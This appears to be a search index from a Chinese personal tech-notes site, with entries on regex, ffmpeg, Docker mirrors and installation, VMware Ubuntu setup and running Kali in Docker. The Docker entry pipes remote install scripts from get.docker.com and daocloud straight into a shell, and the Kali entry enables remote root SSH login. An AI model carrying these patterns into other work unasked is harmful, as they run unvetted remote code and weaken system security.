也就是分别将1、3、5、7号瓶子的药混起来给老鼠1吃， 2、3、6、7号瓶子的药混起来给老鼠2 吃， 4、5、6、7号瓶子的药混起来给老鼠3吃， 哪个老鼠死了，相应的位标1。 如老鼠1死了、老鼠2没死、老鼠3死了，那么就是 101=5号瓶子有毒。 同样道理10个老鼠可以确定1000个瓶子。","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-About-bit-cover.html","loc":"/yq-doc-source-docs-Chaotic-About-bit-cover.html"},{"title":"关于雪球-爆仓","text":"地址: https://www.huxiu.com/article/2563407.html 防止地址失效, 搞成pdf了, ../../resources/pdf/咋就爆仓了？3分钟搞懂雪球产品-虎嗅网.pdf","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-About-snowball.html","loc":"/yq-doc-source-docs-Chaotic-About-snowball.html"},{"title":"浏览器地址栏输入url","text":"末尾加不加/的区别 一般情况下 不加 / 会当作下载资源, 比如chrome就会直接触发下载 加 / 当作地址目录访问","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Browser-input-URL.html","loc":"/yq-doc-source-docs-Chaotic-Browser-input-URL.html"},{"title":"MOD之旅","text":"塞尔达的MOD 素材替换需要转换 RSTB (ResourceSizeTable.product.srsizetabl)， 即： 游戏内部RAM分配 (创建BNP的时候 会计算) BNP都会带RSTB信息, 即 logs/rstb.json 一些工具： SIC独立物品生成器 Blender： 建模软件 ToolBox： 模型提取、Blender弄好的预览 Bcml： bnp生成， MOD整合","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-MOD-journey.html","loc":"/yq-doc-source-docs-Chaotic-MOD-journey.html"},{"title":"正则表达式","text":"正则表达式 - 菜鸟教程: https://www.runoob.com/regexp/regexp-syntax.html 字符表示 普通字符 [...] 匹配 [...] 中的所有字符 [&#94;...] 匹配除了 [...] 中的所有字符 \\s 匹配所有的空白字符, 包括换行 \\S 匹配所有空白符, 不包括换行 \\w 匹配字母, 数字, 下划线. 等价于 [A-Za-z0-9] 字符 描述 [ABC] 匹配 [...] 中的所有字符, 例如 `[aeiou] 匹配字符串 google runoob taobao 中所有的 e o u a 字母. [&#94;ABC] 匹配除了 [...] 中字符的所有字符, 例如 [&#94;aeiou] 匹配字符串 google runoob taobao 中除了 e o u a 字母的所有字母. [A-Z] [A-Z] 表示一个区间, 匹配所有大写字母, [a-z] 表示所有小写字母. . 匹配除换行符 (\\n, \\r) 之外的任何单个字符, 相等于 [&#94;\\n\\r] [\\s\\S] 匹配所有. \\s 是匹配所有空白符, 包括换行, \\S 非空白符, 不包括换行. \\w 匹配字母, 数字, 下划线. 等价于 [A-Za-z0-9_] 非打印字符 字符 描述 \\cx 匹配由 x 指明的控制字符. 例如, \\cM 匹配一个 Control-M 或回车符. x 的值必须为 A-Z 或 a-z 之一. 否则, 将 c 视为一个原义的 'c' 字符. \\f 匹配一个换页符. 等价于 \\x0c 和 \\cL . \\n 匹配一个换行符. 等价于 \\x0a 和 \\cJ . \\r 匹配一个回车符. 等价于 \\x0d 和 \\cM . \\s 匹配任何空白字符, 包括空格, 制表符, 换页符等等. 等价于 [ \\f\\n\\r\\t\\v] . 注意 Unicode 正则表达式会匹配全角空格符. \\S 匹配任何非空白字符. 等价于 [&#94; \\f\\n\\r\\t\\v] . \\t 匹配一个制表符. 等价于 \\x09 和 \\cI . \\v 匹配一个垂直制表符. 等价于 \\x0b 和 \\cK . 特殊字符 一些有特殊含义的字符 若要匹配这些特殊字符, 必须首先使字符\"转义\", 即, 将反斜杠字符放在它们前面. 特别字符 描述 $ 匹配输入字符串的结尾位置. 如果设置了 RegExp 对象的 Multiline 属性, 则 $ 也匹配 \\n 或 \\r . 要匹配 $ 字符本身, 请使用 \\$ ( ) 标记一个子表达式的开始和结束位置. 子表达式可以获取供以后使用. 要匹配这些字符, 请使用 \\( 和 \\) * 匹配前面的子表达式零次或多次. 要匹配 * 字符, 请使用 \\* + 匹配前面的子表达式一次或多次. 要匹配 + 字符, 请使用 \\+ . . 匹配除换行符 \\n 之外的任何单字符. 要匹配 . , 请使用 \\. . [ 标记一个中括号表达式的开始. 要匹配 [ , 请使用 \\[ . ? 匹配前面的子表达式零次或一次, 或指明一个非贪婪限定符. 要匹配 ? 字符, 请使用 \\? \\ 将下一个字符标记为或特殊字符, 或原义字符, 或向后引用, 或八进制转义符. 例如, n 匹配字符 n . \\n 匹配换行符. 序列 \\\\ 匹配 \\ , 而 \\( 则匹配 ( &#94; 匹配输入字符串的开始位置, 除非在方括号表达式中使用, 当该符号在方括号表达式中使用时, 表示不接受该方括号表达式中的字符集合. 要匹配 &#94; 字符本身, 请使用 \\&#94; { 标记限定符表达式的开始. 要匹配 { , 请使用 \\{ . 限定符 限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配. 有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种. 正则表达式的限定符有: 字符 描述 * 匹配前面的子表达式零次或多次. 例如, zo* 能匹配 \"z\" 以及 \"zoo\". * 等价于 {0,} . + 匹配前面的子表达式一次或多次. 例如, 'zo+' 能匹配 \"zo\" 以及 \"zoo\", 但不能匹配 \"z\". + 等价于 {1,} . ? 匹配前面的子表达式零次或一次. 例如, \"do(es)?\" 可以匹配 \"do\" , \"does\" 中的 \"does\" , \"doxy\" 中的 \"do\" . ? 等价于 {0,1} . {n} n 是一个非负整数. 匹配确定的 n 次. 例如, 'o{2}' 不能匹配 \"Bob\" 中的 'o', 但是能匹配 \"food\" 中的两个 o. {n,} n 是一个非负整数. 至少匹配n 次. 例如, 'o{2,}' 不能匹配 \"Bob\" 中的 'o', 但能匹配 \"foooood\" 中的所有 o. 'o{1,}' 等价于 'o+' . 'o{0,}' 则等价于 'o*' . {n,m} m 和 n 均为非负整数, 其中n <= m. 最少匹配 n 次且最多匹配 m 次. 例如, \"o{1,3}\" 将匹配 \"fooooood\" 中的前三个 o. 'o{0,1}' 等价于 'o?'. 请注意在逗号和两个数之间不能有空格. 正则表达式-简洁版 正则表达式(regular expression)描述了一种字符串匹配的模式（pattern）, 可以用来检查一个串是否含有某种子串, 将匹配的子串替换或者从某个串中取出符合某个条件的子串等. ​字符类: . #任意一个字符 [] #匹配括号中的一个字符 - #括号内表示范围 &#94; #位于括号内开头表示不匹配括号内的 [&#94;0-3] 非（0到3）之间 [[:xxx:]] #grep工具预定义的一些命令字符类 数量限定符: ? #匹配0或者1次 + #前一个单元匹配一次或者多次 * #匹配前一个单元0次或多次 {N} #前一个单元匹配N次 {N,} #前一个单元至少匹配N次 {,M} #前一个单元最多匹配M次 {N,M} #前一个单元匹配N至M次 注解 grep 找的是包含某个模式的行, 而非完全匹配. 位置限定符: &#94; #匹配行首的位置 $ #匹配行末的位置 \\< #匹配单词开头的位置 \\> #匹配单词结尾的位置 \\b #匹配以单词开头或者结尾的位置 \\B #匹配非该单词开头和结尾的位置, 与\\b相反 其他特殊字符: \\ 转义字符, 特殊与普通字符相互转换 () 将正则表达式的部分括起来表示一个单元 | 连接两个子表达式表示或的关系 ?: 表示 非捕获组, 即该组的内容不会被单独捕获为匹配结果。 注解 竖线 | 的作用范围是比较广的, 或许这也是其于 [] 的区别: /apple|banana/ # 匹配 \"apple\" 或 \"banana\" /appl[es],banana/ # 匹配 \"apple,banana\" 或 \"appls,banana\" 正则表达式的模式 基础正则表达式(Basic) 扩展正则表达式(extended) Perl正则表达式(Perl) 区别: 基础正则和扩展正则的规范基本相同, 只是在Basic规范下, 有些字符 ?, +, {}, (), | 解释为普通字符, 要表示 特殊含义需要加 进行转义. 在Extended规范下, 这些符号被解释为特殊含义, 要取其字面值, 也要对其进行 \\ 转义. 其他常用通用字符集及其替换 符号 替换正则 匹配 \\d [0-9] 数字字符 \\D [&#94;0-9] 非数字字符 \\w [a-zA-Z0-9] 数字, 字母, 下划线 \\W [&#94;w] 非数字, 字母, 下划线 \\s [_rtnf] 回车, 换行, 制表符等空白区域 \\S [&#94;s] 非空白区域 贪婪模式与非贪婪模式 grep 默认的就是贪婪匹配, 会将一行中所有满足正则的全部匹配出来. 而非贪婪模式是一旦发现匹配符合要求, 立马匹配成功, 而不会继续匹配下去（除非有g, 开启下一组匹配） 零宽断言 用于指定一个位置, 这个位置应该满足一定的条件. 零宽度正预测 (?=正则表达式) 正则表达式所处位置之前, 不包括正则表达式指定的位置的单元. 零宽度正后顾后发断言 (?<=正则表达式) 正则表达式所处位置之后, 不包括正则表达式指定的位置的单元. linux-grep常用选项 见: /docs/操作系统/linux/linux指令/grep 转义符 如下: \\ 表示开始转义, 在Python中处于行尾位置时表示续行符 \\\\ 反斜杠 \\‘ 单引号 \\\" 双引号 \\b 退格 \\n 换行 \\v 纵向制表符 \\t 横向制表符 \\r 回车 \\f 换页","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Regular-expression.html","loc":"/yq-doc-source-docs-Chaotic-Regular-expression.html"},{"title":"搜索引擎实现","text":"数据一般分两类: 结构化数据, 如存储关系数据库中的数据, 查询时候可以直接 sql 语句查询到确定的结果 非结构化数据, 如文章, 如果存储在数据库中, 需要先查询所有文章, 再在每一篇文中检索 普通检索对于结构化数据不可行, 所以需要对其进行一定处理, 这就是 全文检索 将非结构化的数据中的一部分信息提取出来，然后以某种规则重组，使其变得有一定的结构， 然后对此结构数据建立索引并进行搜索，从而达到快速搜索的目的。 比如 ElasticSearch 的 倒排索引","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Search-engine-implementation.html","loc":"/yq-doc-source-docs-Chaotic-Search-engine-implementation.html"},{"title":"版本说明","text":"软件版本说明 软件版本说明: https://blog.csdn.net/gnail_oug/article/details/79998154 系统版本说明 X86: 系統是 32 bit 的版本 X86-64: 系统是 64 bit 的","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Version-description.html","loc":"/yq-doc-source-docs-Chaotic-Version-description.html"},{"title":"ffmpeg介绍","text":"Python下有个三方库, 可见: /docs/后端/python/python三方库/ffmpeg 前言 FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。可以轻易地实现多种视频格式之间的相互转换。 名称来自于MPEG视频编码标准, FF代表 \"fast forawrd\". 包含以下部分 libavformat：用于各种音视频封装格式的生成和解析，包括获取解码所需信息以生成解码上下文结构和读取音视频帧等功能，包含demuxers和muxer库。 libavcodec：用于各种类型声音/图像编解码。 libavutil：包含一些公共的工具函数。 libswscale：用于视频场景比例缩放、色彩映射转换。 libpostproc：用于后期效果处理。 ffmpeg：是一个命令行工具，用来对视频文件转换格式，也支持对电视卡实时编码。 ffsever：是一个HTTP多媒体实时广播流服务器，支持时光平移。 ffplay：是一个简单的播放器，使用ffmpeg 库解析和解码，通过SDL显示。 ffprobe：收集多媒体文件或流的信息，并以人和机器可读的方式输出。 基本概念 容器(Container)与流(Stream) 容器包含流与文件头 容器/文件(Conainer/File) 即视频格式, 特定格式的多媒体文件，比如mp4、flv、mkv等 媒体流(Stream) 一种视频信息传输格式, 有5种: 音频、视频、字幕、附件、数据. 表示时间轴上的一段连续数据，如一段声音数据、一段视频数据或一段字幕数据，可以是压缩的，也可以是非压缩的，压缩的数据需要关联特定的编解码器。 数据帧/数据包(Frame/Packet) 帧代表一幅静止的图像，分为I帧，P帧，B帧。 通常，一个媒体流是由大量的数据帧组成的，对于压缩数据，帧对应着编解码器的最小处理单元，分属于不同媒体流的数据帧交错存储于容器之中。 一般情况下： Frame对应压缩前的数据，Packet对应压缩后的数据。 编解码器(Codec) 以帧为单位实现压缩数据和原始数据之间的相互转换, 对视频进行压缩或者解压缩，CODEC = COde（编码） +DECode（解码）。 复用/解复用(mux/demux) 把不同的流按照某种容器的规则放入容器，这种行为叫做复用（mux）。 把不同的流从某种容器中解析出来，这种行为叫做解复用(demux)。 帧率 帧率也叫帧频率，帧率是视频文件中每一秒的帧数，肉眼想看到连续移动图像至少需要15帧。 码率 比特率(也叫码率，数据率)是一个确定整体视频/音频质量的参数，秒为单位处理的字节数，码率和视频质量成正比，在视频文件中中比特率用bps来表达。 参考:: https://zhuanlan.zhihu.com/p/117523405 https://cloud.tencent.com/developer/article/1773248","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-ffmpeg.html","loc":"/yq-doc-source-docs-Chaotic-ffmpeg.html"},{"title":"集群安装","text":"集群安装 k8s集群主流安装方式对比分析 minikube 二进制安装 kubeadm等安装工具 核心组件 静态Pod的方式: ## etcd, apiserver, controller-manager, kube-scheduler $ kubectl -n kube-system get po systemd服务方式: $ systemctl status kubelet","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-K8S-Cluster-installation.html","loc":"/yq-doc-source-docs-Container-and-cluster-K8S-Cluster-installation.html"},{"title":"docker配置镜像","text":"后面看到github上有: https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6 镜像配置概述 由于网络原因官方镜像下载很慢, 所以需要配置镜像加速. 配置成功后都是执行 docker info ,查看输出是否有自己配置的镜像地址. linux 适用于linux, 将配置加到 /etc/docker/daemon.json mkdir -p /etc/docker tee /etc/docker/daemon.json <<-'EOF' { \"registry-mirrors\": [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\", \"https://ypzju6vq.mirror.aliyuncs.com\", \"https://registry.docker-cn.com\", \"http://hub-mirror.c.163.com\", \"https://docker.mirrors.ustc.edu.cn\" ] } EOF systemctl daemon-reload systemctl restart docker mac 右键点击桌面顶栏的 docker 图标, 选择 Preferences (偏好) , 在 Docker Engine 标签下的 Registry mirrors 列表中将镜像地址的数组: \"registry-mirrors\": [\"https://你的前缀地址.http://mirror.aliyuncs.com\"] 点击 Apply & Restart 按钮, 等待Docker重启并应用配置的镜像加速器。 注解 原以为mac也是跟linux类似, 结果在 /etc/docker/daemon.json 加入了配置不生效. 思索了一下可能有两个原因: Docker for Mac 跟命令行安装的docker不一致 mac下安装的docker只能在应用内配置 更正, 是这两个原因也不是, mac下一般都是用的用户安装的, 所以默认的配置地址为 ~/.docker/daemon.json , 而非 etc 下的目录. 镜像参考 { \"registry-mirrors\" : [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\" , \"https://ypzju6vq.mirror.aliyuncs.com\" , \"https://registry.docker-cn.com\" , \"http://hub-mirror.c.163.com\" , \"https://docker.mirrors.ustc.edu.cn\" ] } 官方国区docker \"https://registry.docker-cn.com\" 网易 \"http://hub-mirror.c.163.com\" 中科大 \"https://docker.mirrors.ustc.edu.cn\"` 不同系统容器与镜像位置 linux cd /var/lib/docker - 容器与镜像存放在此目录下 镜像位置: /var/lib/docker/image 容器位置: /var/lib/docker/containers mac, 不同版本或许可能文件版本不一样 /Users/xxxxmyname/Library/Containers/com.docker.docker/Data ,可以到上面的目录中, 查看文件大小, du -sh * 本机存放位置如下: /Users/xxxxmyname/Library/Containers/com.docker.docker/Data/vms/0/data/Docker.raw 注解 设置docker清华源可参考: Docker Community Edition 镜像使用帮助 另外一般 apt 更新提示校验不一致的, 一般就是国内镜像源没有更新. 补充一个自己 Ubuntu 服务器配置Docker的命令集 # 如果你过去安装过 docker，先删掉: sudo apt-get remove docker docker-engine docker.io containerd runc # 首先安装依赖: sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common # 根据你的发行版，下面的内容有所不同。你使用的发行版： # Ubuntu # 信任 Docker 的 GPG 公钥: curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg # 添加软件仓库: echo \\ \"deb [arch= $( dpkg --print-architecture ) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $( lsb_release -cs ) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null # 最后安装 sudo apt-get update sudo apt-get install docker-ce","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html"},{"title":"docker容器化下的协作开发","text":"持续交付部署 保障一致性的环境 开发人员 代码写好之后，还会开发 dockerfile 脚本完成， 将代码，和环境依赖，全部打包为一个镜像文件(images) 测试 直接拿 images, docker run 运维 直接拿 images, docker run","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html"},{"title":"docker使用","text":"常见 基于 dockerfile 直接打包images 常见使用 虚拟机 + 容器","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-use.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-use.html"},{"title":"docker","text":"对进程进行封装隔离，属于操作系统层面的虚拟化技术。 利用Docker可以实现开发，测试，生产环境的部署一致性，极大的减少运维成本。 结构 简而言之 最上层是可写层(容器层), 操作都是在这里进行 下面的镜像层只读 容器层的操作遵循 写时复制 ; 当在这里修改一个文件时, 会自顶向下的找文件, 找到后复制到容器层然后修改; 如果是删除, 也不会删除底层镜像内容, 而只是标记为删除状态. 概述 三个基本概念 镜像（Image） Docker 镜像（Image）, 就相当于是一个 root 文件系统。 比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器（Container） 镜像（Image）和容器（Container）的关系, 就像是面向对象程序设计中的类和实例一样, 镜像是静态的定义, 容器是镜像运行时的实体。 容器可以被创建、启动、停止、删除、暂停等。 仓库（Repository） 仓库可看成一个代码控制中心, 用来保存镜像。 Docker 使用客户端-服务器 (C/S) 架构模式, 使用远程API来管理和创建Docker容器。 Docker 容器通过 Docker 镜像来创建。 容器与镜像的关系类似于面向对象编程中的对象与类。 容器与镜像的关系 Docker 面向对象 容器 对象 镜像 类 注解 有个误解, Docker不完全代表容器; Docker只是实现了容器技术的一种方式 官方一些的释义 正式一些说明 相对官方一些的说明 概念 说明 Docker 镜像(Images) Docker 镜像是用于创建 Docker 容器的模板, 比如 Ubuntu 系统。 Docker 容器(Container) 容器是独立运行的一个或一组应用, 是镜像运行时的实体。 Docker 客户端(Client) Docker 客户端通过命令行或者其他工具使用 Docker SDK ( https://docs.docker.com/develop/sdk/ ) 与 Docker 的守护进程通信。 Docker 主机(Host) 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。 Docker Registry Docker 仓库用来保存镜像, 可以理解为代码控制中的代码仓库。Docker Hub([ https://hub.docker.com](https://hub.docker.com/ )) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常, 一个仓库会包含同一个软件不同版本的镜像, 而标签就常用于对应该软件的各个版本。我们可以通过 <仓库名>:<标签> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签, 将以 latest 作为默认标签。 Docker Machine Docker Machine是一个简化Docker安装的命令行工具, 通过一个简单的命令行即可在相应的平台上安装Docker, 比如VirtualBox、 Digital Ocean、Microsoft Azure。 安装-服务器版 自动安装 使用官方安装脚本自动安装 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 使用国内 daocloud 一键安装命令： curl -sSL https://get.daocloud.io/docker | sh 手动安装 卸载旧版本 Docker 的旧版本被称为 docker, docker.io 或 docker-engine 。如果已安装, 请卸载它们： sudo apt-get remove docker docker-engine docker.io containerd runc 当前称为 Docker Engine-Community 软件包 docker-ce 。 使用 Docker 仓库进行安装 在新主机上首次安装 Docker Engine-Community 之前, 需要设置 Docker 仓库。之后, 您可以从仓库安装和更新 Docker 。 设置仓库 更新 apt 包索引: $ sudo apt-get update 安装 apt 依赖包, 用于通过HTTPS来获取仓库: $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common 添加 Docker 的官方 GPG 密钥： $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符, 验证您现在是否拥有带有指纹的密钥。 $ sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017 -02-22 [ SCEA ] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown ] Docker Release ( CE deb ) <docker@docker.com> sub rsa4096 2017 -02-22 [ S ] 使用以下指令设置稳定版仓库 $ sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \\ $( lsb_release -cs ) \\ stable\" 安装 Docker Engine-Community 更新 apt 包索引: $ sudo apt-get update 安装最新版本的 Docker Engine-Community 和 containerd , 或者转到下一步安装特定版本： $ sudo apt-get install docker-ce docker-ce-cli containerd.io 要安装特定版本的 Docker Engine-Community, 请在仓库中列出可用版本, 然后选择一种安装。列出您的仓库中可用的版本： $ apt-cache madison docker-ce docker-ce | 5 :18.09.1~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 5 :18.09.0~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.1~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.0~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages ... 使用第二列中的版本字符串安装特定版本, 例如 5:18.09.1~3-0~ubuntu-xenial: $ sudo apt-get install docker-ce=<VERSION_STRING> docker-ce-cli=<VERSION_STRING> containerd.io 测试 Docker 是否安装成功, 输入以下指令, 打印出以下信息则安装成功: $ sudo docker run hello-world Unable to find image 'hello-world:latest' locally latest: Pulling from library/hello-world 1b930d010525: Pull complete Digest: sha256:c3b4ada4687bbaa170745b3e4dd8ac3f194ca95b2d0518b417fb47e5879d9b5f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1 . The Docker client contacted the Docker daemon. 2 . The Docker daemon pulled the \"hello-world\" image from the Docker Hub. ( amd64 ) 3 . The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4 . The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Introduction-to-docker.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Introduction-to-docker.html"},{"title":"一些坑","text":"挂载本地卷不同步 使用 -v 挂载的卷不同步, 搜了一下大多都说是权限问题, 不认可... 重启容器未解决. 最后重启电脑解决了.","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Some-pits.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Some-pits.html"},{"title":"windows安装Ubuntu","text":"环境 系统: windows11 安装概述 安装虚拟机 windows上一般都是用的 Wmware Woprkstation , 官网下载地址: Wmware Woprkstation下载页面 , 截至2022-12-11, 最新版为17Pro, 安装包下载地址: Wmware Woprkstation安装包 . jihuo: 许可证密钥 . 安装Ubuntu 官网 下载镜像安装. 设置 换源 我使用的是清华源, 备份原来内容, 将新地址写入即可 # 默认注释了源码镜像以提高 apt update 速度, 如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # 预发布软件源, 不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse 备份: mv /etc/apt/sources.list /etc/apt/sources.list.bak 写入: echo \"上面源地址\" >/etc/apt/sources.list ,或者直接vi进去修改(第一次安装的系统没有vim) 注解 注意源地址后面的 jammy 代表了当前版本是 Ubuntu 22, 可以通过 lsb_release -a 查看 查看当前已安装Ubuntu版本 不是安装的22版本的注意换成自己对应版本的代号. docker run时候配置映射路径 windows与linux路径分隔符不一样，不过还是可以使用linux的分隔符传入， 比如我本地的路径是: D:\\project\\rst-document\\build 可以这样传入: docker run --name mynginx -p80:80 -v \"/D/project/rst-document/build/html:/usr/share/nginx/html\" -d nginx","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html"},{"title":"Docker安装Kali","text":"命令 # 拉取镜像 docker pull kalilinux/kali-rolling # 查看 docker images # 运行 # -t 让 docker 分配一个伪终端并绑定到容器的标准输入上 # -p 映射端口, # -d 保持后台运行， # -c 执行一些命令 # docker run -t -d -p 60000:22 -p 60001:5901 -p 60002:5902 fd54aef8e4ea /bin/sh -c \"while true; do echo hello world; sleep 1; done\" docker run --rm -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling docker run -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling # 查看容器 docker ps # 进入 docker exec -it mykali /bin/bash 系统环境配置 # 修改 root 用户密码 passwd root 国内修改镜像源 # 阿里云镜像源 vi /etc/apt/sources.list #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib #163 deb http://mirrors.163.com/debian/ jessie main non-free contrib deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb-src http://mirrors.163.com/debian/ jessie main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib SSH服务 # 更新系统 apt-get update && apt-get upgrade # 安装所需软件 apt-get install vim net-tools openssh-server # 修改 vim 配置文件，允许 root 用户远程登录 vim /etc/ssh/sshd_config #启动 ssh 服务 service ssh start #允许开机自启动 systemctl enable ssh 通过60000端口ssh连接 必要工具安装 apt update apt install lsb-release vim git python3 net-tools kali-linux-everything 注解 kali-linux-everything 太大了, 几个G了还没完 官网建议这样装: # apt update && apt -y install <package> apt update && apt -y install kali-linux-headless apt update && apt -y install kali-linux-large","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-installation-Kali.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-installation-Kali.html"},{"title":"容器生命周期管理","text":"run 创建一个新的容器并运行一个命令, 如果没有会自动pull拉取 语法: docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 注解 [COMMAND] [ARG...] 会覆盖 dockerfile </docs/容器与集群/docker/dockerfile编写> 的 CMD OPTIONS说明: -a stdin 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d 不使用此选项就直接在当前命令行窗口前台执行; -i 以交互模式运行容器，通常与 -t 同时使用； -P 随机端口映射，不加参数就是对于容器内打开的所有端口, 自动寻找主机空闲端口映射 -p 指定端口映射，格式为: 主机(宿主)端口:容器端口 -t 为容器重新分配一个伪输入终端，通常与 -i 同时使用； --name= <name> 为容器指定一个名称； --dns <8.8.8.8> 指定容器使用的DNS服务器，默认和宿主一致； --dns-search <example.com> 指定容器DNS搜索域名，默认和宿主一致； -h mars 指定容器的hostname； -e <username=ritchie> 设置环境变量； --env-file= <env_file> 从指定文件读入环境变量； --cpuset= <nums> 如 --cpuset=\"0-2\" --cpuset=\"0,1,2\", 绑定容器到指定CPU运行； -m 设置容器使用内存最大值； --net= bridge 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； --link= <link> 添加链接到另一个容器； --expose= <ports> 开放一个端口或一组端口； --volume , -v 绑定一个卷, 格式为 $宿主机目录:$容器内目录 --rm 退出容器时, 自动删除此容器 --restart always表示检测到挂掉后自定重启 注解 一般不跟任何参数: docker run $image_name 总是会产生一个挂掉的容器, 只有容器内有进程运行的时候, 才不会挂掉 容器内的进程 , 